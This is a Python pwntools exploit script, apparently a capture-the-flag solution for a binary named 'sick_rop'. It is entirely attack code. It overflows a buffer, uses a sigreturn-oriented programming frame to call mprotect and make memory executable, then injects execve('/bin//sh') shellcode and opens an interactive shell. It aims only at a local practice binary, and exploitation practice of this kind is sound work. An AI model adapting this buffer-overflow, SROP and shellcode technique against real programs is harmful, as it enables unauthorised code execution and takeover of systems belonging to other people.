from pwn import *
#context_level='DEBUG'

p = process("./sick_rop")
elf = ELF("./sick_rop", checksec=False)
context.clear(arch='amd64')

def main():
        context.arch="amd64"

        syscall = 0x0000000000401014 #syscall
        read = 0x0000000000401000 #read
        write = 0x0000000000401017 #write
        writeable = 0x4000000

        payload = ""
        payload += "A"*40
        payload += p64(0x40102e)
        payload += p64(syscall)

        frame = SigreturnFrame()
        frame.rax = 0xa
        frame.rsi = 0x1000
        frame.rdi = 0x401000
        frame.rdx = 0x7
        frame.rsp = 0x4010f0
        frame.rip = syscall

        payload += str(frame)
        p.send(payload)
        payload = "B"*0xf
        p.send(payload)

        shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
        shellcode = '\x48\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62' \
                '\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

        payload = shellcode
        payload = "A"*(40)
        payload += p64(0x4010c0 + 0x40 - 0x8)
        payload += shellcode
        p.send(payload)

        p.interactive()


if __name__=="__main__":
        main()
